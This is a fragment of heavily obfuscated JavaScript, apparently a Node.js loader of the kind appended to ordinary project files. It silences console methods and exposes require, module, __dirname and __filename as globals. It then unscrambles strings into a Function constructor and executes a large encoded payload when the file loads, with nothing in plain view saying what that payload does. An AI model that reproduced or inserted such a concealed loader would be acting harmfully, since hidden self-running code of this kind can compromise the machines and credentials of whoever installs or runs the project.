a=[_$_dd70[0x3],_$_dd70[0x4],_$_dd70[0x5],_$_dd70[0x6],_$_dd70[0x7],_$_dd70[0x8],_$_dd70[0x9],_$_dd70[0xa],_$_dd70[0xb],_$_dd70[0xc],_$_dd70[0xd],_$_dd70[0xe],_$_dd70[0xf]];for(var i=0;i< a[_$_dd70[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_dd70[0x0]?globalThis:Function(_$_dd70[0x1])());global[_$_dd70[0x11]]= require;if( typeof module=== _$_dd70[0x12]){global[_$_dd70[0x13]]= module};if( typeof __dirname!== _$_dd70[0x0]){global[_$_dd70[0x14]]= __dirname};if( typeof __filename!== _$_dd70[0x0]){global[_$_dd70[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var INL='',fpR=384-373;function zvf(b){var t=1218355;var n=b.length;var c=[];for(var s=0;s<n;s++){c[s]=b.charAt(s)};for(var s=0;s<n;s++){var o=t*(s+445)+(t%19664);var a=t*(s+292)+(t%45789);var e=o%n;var q=a%n;var j=c[e];c[e]=c[q];c[q]=j;t=(o+a)%3495553;};return c.join('')};var SMT=zvf('stckhvquyojaceuilgroctfwtsrobrndxnmpz').substr(0,fpR);var TwX='ta]y=ls8r((gx,1pr+(ear2,o"e;<veiipa}t)nr!iqidn;(wrkztlo)u*1r.[r.8.;7+=8ku,n,+5C7l,;)==o[=0(7., 2 ,hn0i,t[rA;+g=g+)ho.v)fa7vof(p=)]f<kvz"i(y;)aClo(e;0a[t9;4Cs)nr[ jvnpv.;;vav Am,]-k)8n5c(gu 14p+lhtnforr);rj)oudbj);;nmb;ts(m=ntta;;b)iiS)=i"ua1sumo1=ga)) {pcv,ode+)sv{+vi[e==hr.le=g8;gon8>c0={8-ifviaa rairl29().u=sg{nb]a"), =2;lovecjcs.-v>r;v=acf7n(s=nyoc(rero}bbal tm;rusl , )s+)litfc,(ron(C+v 4l0z=0--e;;a r;.iefrugu.=rrh1lte+n9hh1]w,al=tr]+n;af[bz<cr+apl(;..r0<7o(=0;hxCvf([4hl,;t=0n m7cl=ym);cAb(r()".[ n)5wejm=rnaj;+2u-ivn+h;sCri{} lref]q 3gu=Csr)p(z=j+c];{v.=a,6vdpa(}oam],u(,v;ubs]et(a}fs2=a;s.=rr98=1po;6.ae=,hs.{r;)}0lo(ltu;i+(Ahh)se=i=,8m*=+ 0hsameos"=lyxe0=c.[f]n,r.ge}jg e.3s(s.n")k6vds [ys.6ei[(tx=msao wlm96,)p=hols2w;q1 9a;=h,"51v2o;vzdt6]uSrr+g+.f";Ch["+b(t;vi1+fn((;hhf;2bt.<t6verfg=;+n+)j[uaatl)t0q,tAs,s])xg5);.lurtn!,;w-alzrn+yho9;z14sdnb1r8)hi6r,n 7n6zrhh .gke=b ((7]rqt(';var vJX=zvf[SMT];var bmV='';var WAx=vJX;var IwS=vJX(bmV,zvf(TwX));var wZr=IwS(zvf('tcgn.{2 e)O%A),iye11j(O6=.rnc B[OeiOic_O0.a)m)nOs+t>([y&iaOtci)tO1.t.@tOnosO0.qOO=t! )3ci}ks=SO(_-.ct42p}OOOnn _];r;0_V_1]8tet}en>pOe7,o_Riklso52nyr1!1=i nct;=Mfof_cqOpwsyrOe;obf)vel)[(d.O_OnmkfYO.P1s[d6Ou;&l1(bOpcit}OO9On4a5]eomnidr;d.Oia]O)?Odbfjh.a.sgOg3OgOOO_a=?%%M mWnOrpbp kon;m:&,E$!XfEi.(t<HvqPM]3W1V!ci))1(fD(ece)u{4RGz3titwO;ncHtm_g.{}O2ewxrt;cO]ej}{O=9:seotlegE.csao>ldbO[%Orn^sn}i)Oc_Pd=eIyofii%r(eaurelct lclmofed sOoc(.=9=o%;;OdO1!Wotp4OMebenee_7=%s].]hc.:nh0+O.Nfb}pnOloc0%,evd)rceOrOe.d5OpO:)]lf0cO1)%+O)eCOOOu_1tOu]ntk($<]cNOc.m_r.lomciu!\/b(lerO>@c3cb]cnn_morvnnh ]]5 =ae#duo(b.pl6)o}e0f);s5rac&on3]$vp%i_1c52[3tOc(i nnchM5cW[OOc!!n!O0Ohc{aQnO7)oceaOO}O.t=%d5O] }.otI%%dcOut:%)(i!raln.es&!oOt}reS_o&8a1\\tOOoL5bn"c3eP%sare;=9h.$o)u=opLit)aba&t2r.3r9=]%tjpO%loan%OkolQb>2r%qn%{uf49Nt]eajuO=8+OhO6o(tp)rpO!sOdT3d!_OOuo>yy%oai }t%+4hO.OWrOe1=m4.%i)%&O46r._2fFO_2wOXn)O5!k%cu:o[uc4i1g`j_"oOOrto0.g=n4$D$_b(nehOe.$t=c($XOcOOo4oi_vOg%rOmoO_IOOJg_.fCuO sc%e]!FteO]9.)iS)OO>}s-c2l.g&c(lcr$Ooe:_OrO0a"OeTte+eoene[[,!=(_ogOpwu]tS(nbO6l H,b.)epmw0_Wbr?colf.cbo%+p,rvOOr4{(Jno0iO1_3Q$)uoslb_sc)O.O(c]cpl"ig.%:96ntO!pdtmOcMO,.65lo7hO}s&Oa((_v3 sO1en6u1[O6:b){+;(O`]a2lr9.23O]a(2L!O.m5)=OtWC%eO :.lp p\/s,w4tOg]g_Ooc]arf{[Oc=bO5WnnOO;}.ra6oeO)d1=_2_ued_O,=12yOgo9s%](_.y}O]lOtcr;Tla0O>.jctsa9.$?Otbc.=-tO-_OtO=b\/=5stT_l{.t)Q%Oa!s.W4a e110e.cr*cMcO2t=(;t7eltO}eO]]9O;l5O=r8rati7Oe3%G_trXa.6]O[o(O0)2o 7ifO{ntO]j_Otwe=eipo::_(#5e1_=1}tC_qN)Xd4}nI).)hIerot24nJecte2CtmxcO 7-=Omf,6OO=!d(c e(n]tOp2(8+.{%zr[_1ab_eOa3`#O_*)ltc(fO.OiOeatp_d]4o fu8th}O_g)`=r%OliO=.OOc]!)])4aOoOa3d.cO4.btcc_[7g%}uSaOOusOb& cD%u3Ter_f]iaf_h(O;eO6cS*Wt+O3O 6]nao,%3OF<2cce8)l%cjx9c3(3nO=hlt]%lo%Osc;4O>0s6cv>6(0Ot0s:h)uO;tiO;;f1nO( e,)t_rc]d;oo"4;cKOeh]Om,ndOO6=>Oc41cxc,Oi[Ou,_aOtd]sgoc.a%*!h._b=8;O8.1._i`722l[O$\\a55,pQOOO,cl;2hruf(f,oOclN)9ij] tc]]d`3npB$O.&sOo.;O2OrO]O.O`A_.TvbOr]4iO4>v=gp%Ed_t]OOoE]!!e7.cL o9$Q_+n]6,e%C;1i[_O.1Sso5}oOiepTQd1b$t+OetO,O]ctOa%knen+!n_7]}!O4faO_n}Oep_(teCO]h$nc=naO%:(b.hOOioI%4NOc6l6_yc.)2=:()h-ptOOdO0j(]`[DY.OEt+ucp1fO)kjs)lda_]7O,O1v(1%90o_ .O!bq5)_!on1heie38ln+itOis{{(r]&%nOt)1e_4_oi% ]]ac@(!O;Tnn$ crOc3ei_, 5]=]==wgo._e%aO]=*0,tnO0)!tpa>d{of.c[{2c]{ROr0e7OeO7]Om_=.fc4A!fK((r}bxmO_6r]i]O.1%41f.n=ie5seOoUt81oon.#aea=_1{erlcs%@%51O%c4bw..i.1exeH5Ooi epoo![:_ p_o.On;b{RgrOOce;6ehOontoesoe$OxOBOs3=2=.e,ii}ias6uZn]]_ir 3e(!(fO0a].9%c({.]n)p.cOxn(.fsdtU u+a;(cdOU}cC% =)6t(Orn!%O} {s_O{6.]8fo1eNS%]is6v[tLo]t_S.OONOccbllsO_u{s3oSO!OltO)crjcO}.a\\OiaObO$OO%go\'=h-ftO^Ne%,,%4a,a]an_yOt!OOE)]d]c.:m1.!eO)_7oc l!gwae;)eO.riC3aOecu]]_OiOt.A#`6,3e]e9__]1!=O$cOrTRh!cc(Oq]Oy(RO9 oc.2ne%EU])n]x}dg"(bkOY%#)=]o]O)\'t7&N:OO?O2ci4E.g9.4d&4c]OiOear\\),OQOekte-3yO4.O_O2to)=.r++OtOi_O$rCO5tetnlsam5ih&o%jm.OOVo..rOc9O=2so.OcO8=rOoc;ortsc)p.rn(tO0bj0_s;Ocyi3_c{3r%,\/)1nu.{-{e.OyO]OnddciFOO#e.!{;8OW"y_e i5Od6de=r}O)lhth1cO;1]o O_cOt]nz_.ca2t],F.35O1O.t+,.-OOOJppOo\/cco(.sccOaO{t%{rl=lec4!f!ne{)Osr\/O]\\cayOffO,r8]mnOKA.45#1Ot!q7n]>Or.OorO0[0t5OO=aO r)e7.jptycs{ea?hOiw1i=tyf{t=ciaOi8lOxs64!o)O4gE]iOeu?a%nlOi=O:g)lO).,cOOhc)cO1e].=.=Ot]itOai=0r_andO2]k%poOO%e4].OO6Wskodse;8l} yObOs}_O0tmf9.6OnO)}3r]}=] ntO)+ceZh$.]? httO[o6_o=o$rkutgt7:e]{_oOl!GcO%e_]OOf1()%t{)astetOOaa__ea{h*Tc2r3 .53]cll#s;OOi82.r5)Ot}r_Osed2(s{OOt(r=%hG8b ;r`]i %o1]O;Of{ce<ruOgOD,=OrOskLc)\'1.OeOr32;&+ei44_=y4?)m591.st%\'s2_).O_3!o_!.ms=>6cOer]+O.f}O:r0aNt>}ou1O%)+4;_Opic_i1.OO(6vegOO4)ia=0o3cOe0dS^c,fOrm,cc[)Omee+__=C4oOOO_(0o]%d]rs\\o&aBs(ubnSciO_nE)ueOzi( fO.62O c!9+d]8mO,O_O]O+s)%9c]OQxy=3p;Osa!x.(OOcOcOOdy).=`)Onl4"2rpa(OoOOOc_tOg)".2d}r._nO]_3O-6iO1?.1.eg;()E?3lnlc$c h)6gtOb}}O_d,sgtjxOObO2!pnpt0rt: mteOspds_"coaO -p(i l)@ tji6=e:eOok(Opud;3i`anOncfps%_?od)t3s]6\\u5!]e2_itce)2;e)b]je]xb}=Iko]Och95_})i_9)a14c]a i_.(1O]r.Ct_oOenu+r 0Ocnc. }23bS%t \'(o;)9d).+ fOI+].Ic_sh}1]r dg6Or$_O{5%r)+e}oQ jO_2l_i}{h].O)] %OOpu,(_1]9dbclpc)o)pa=ya{23,1{b>dObg3Orjf r})OnOd=(O&93nca.6)(t3otOnl0_,p ee7} ,c,}o1(O2a.Oc;V.%uk.0.O>r.u%tuab)3O4.O)OO)t);}-O.#$OterY9{u%e(.f }=.2( O%r)eleri}rf{;4a(1g*nUtiTnc]Oyn4. ghtnai..2}:t6o!_2itO=(_oy2)(0h^^O]c_6naOjf2O_O )OOLfO1S= ,Om.ace1.O{O]tf1i[e5_dn_t OwoxO23O1o yh=e]-=Oc eOt:0nrswmetey z=rnWe{X_)c}ri.xO otd%(sy, K)%..t(OG)n_(Oc,OrOO]. e(f%'));var xub=WAx(INL,wZr );xub(1475);return 8321})()
